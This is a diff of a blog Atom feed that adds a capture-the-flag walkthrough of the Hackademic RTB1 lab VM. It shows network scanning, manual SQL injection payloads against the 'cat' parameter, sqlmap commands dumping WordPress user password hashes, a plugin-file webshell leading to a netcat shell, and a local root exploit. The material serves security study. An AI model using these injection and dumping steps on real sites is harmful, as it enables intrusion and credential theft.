@@ -4,7 +4,7 @@
   <title><![CDATA[Category: wordpress | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/wordpress/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-08-01T15:20:40-05:00</updated>
+  <updated>2016-08-03T14:35:54-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,149 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[hackademic:rtb1]]></title>
+    <link href="http://wg135.github.io/blog/2016/08/03/hackademic-rtb1/"/>
+    <updated>2016-08-03T10:30:58-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/08/03/hackademic-rtb1</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>Netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Wpscan</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/rtb1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.157 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.157 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Only port 80 is opening.</p>
+
+<p>Use both wfuzz and nikto to scan the host, nothing interesting&hellip;</p>
+
+<p>Check the page,</p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find a link <code>http://192.168.41.157/Hackademic_RTB1/</code></p>
+
+<p>use wfuzz to scan:</p>
+
+<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.157/Hackademic_RTB1//FUZZ 2&gt;/dev/null
+</code></pre>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>There is a wordpress.</p>
+
+<p>use wpscan to scan</p>
+
+<p><code>wpscan http://192.168.41.157/Hackademic_RTB1/</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>There are a couple of exploits, I tried both of them and no luck.</p>
+
+<p>Enumerate the page, find a possible SQL injection potint:</p>
+
+<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0'</code></p>
+
+<p>looks like parameter cat is vulnerable</p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>next try:</p>
+
+<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 order by 1</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>keep trying until</p>
+
+<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 order by 6</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>got error. Now I know the current table in user by the vulnerable page has 5 columns.</p>
+
+<p>next</p>
+
+<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 union all select 1,2,3,4,5</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now I can use second column to do injection.</p>
+
+<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0%20union%20all%20select%201,@@version,3,4,5</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>next use sqlmap to get all tables,</p>
+
+<p><code>sqlmap -u "http://192.168.41.157/Hackademic_RTB1/?cat=0" --dbms mysql --tables --level=5 --risk=3</code></p>
+
+<p>get table names:</p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I want to check table <code>wp_users</code></p>
+
+<p><code>sqlmap -u 'http://192.168.41.157/Hackademic_RTB1/?cat=0' -D wordpress -T wp_users  --columns</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>dump these two columns</p>
+
+<p><code>sqlmap -u 'http://192.168.41.157/Hackademic_RTB1/?cat=0' -D wordpress -T wp_users -C user_nickname,user_pass --dump</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now we can edit php webshell via plugin</p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Only textile1.php can be updated. Use that file to edit shell.</p>
+
+<p>Setup netcat, and load <code>http://192.168.41.157/Hackademic_RTB1/wp-content/plugins/textile1.php</code></p>
+
+<p>get shell</p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p><code>uname -a</code></p>
+
+<p>get the <code>Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux</code></p>
+
+<p>I tried serveral local exploits and find this one works:</p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the root:</p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_023.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[stapler]]></title>
